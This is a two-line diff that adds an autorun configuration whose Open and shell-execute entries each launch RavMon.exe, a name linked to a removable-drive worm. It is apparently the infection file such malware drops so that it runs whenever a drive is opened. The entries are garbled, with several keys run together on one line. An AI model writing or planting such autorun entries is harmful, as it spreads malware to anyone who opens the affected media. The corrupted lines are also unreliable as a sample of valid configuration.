@@ -1,0 +1,2 @@
+[Autorun]
+Open=RavMon.exe eshellexecute=RavMon.exe shelluto\command=RavMon.exe
